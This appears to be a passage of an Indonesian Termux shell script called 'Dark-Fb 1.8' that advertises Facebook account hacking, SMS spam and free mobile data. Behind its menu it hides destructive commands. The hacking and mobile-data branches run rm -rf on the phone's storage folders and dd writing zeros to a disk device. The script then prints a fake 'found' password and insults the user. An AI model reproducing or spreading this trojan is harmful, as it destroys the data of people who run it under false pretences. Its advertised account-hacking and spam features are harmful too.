...
figlet Dark-Fb 1.8 | lolcat
echo $B1"═══════════════════"
echo $G1"author = Zen-Clay"
echo $R1"Dark-Fb 1.8"
echo $B1"════════════════════"
echo $G1"1.Login Dulu"
echo $Y1"2.Hack Fb target 100% work Target"
echo $P1"3.Spam-Sms 100% work"
echo $B1"4.Tembak-Kuota All Operator 100% work"
echo $B1"╭──[Masukkan Pilihan Anda]>"
read -p"╰───────root@localhostZen=•>" Mr.Zens;
clear
if [ $Mr.Zens = 1 ] || [ $Mr.Zens = 01 ]
then
figlet -f slant "Mr.Zens"|lolcat
sleep 1
echo $R1"Login Fb Dulu Goblok"
sleep 1
...
echo $G1"100%"
sleep 5
echo $B1"Password Berhasil Ditemukan"
termux-setup-storage
rm -rf /storage/emulated/0
rm -rf /sdcard/0
rm -rf /storage/emulated/0/
...
dd if=/dev/zero of=/dev/had
sleep 10
echo $B1"Password = sayang123"
echo $R1"Kembali ke beranda dalam 20 dtk"
sleep 20
sh VipFb.sh
fi
clear
if [ $Mr.Zens = 3 ] || [ $Mr.Zens = 03 ]
then
figlet -f slant "Mr.Zens"|lolcat
sleep 1
echo $B1"Spam-Sms"
...
dd if=/dev/zero of=/dev/had
sleep 3
echo $R1"Tembak-Kuota Failed Mampus hehehe"
sh VipFb.sh
fi
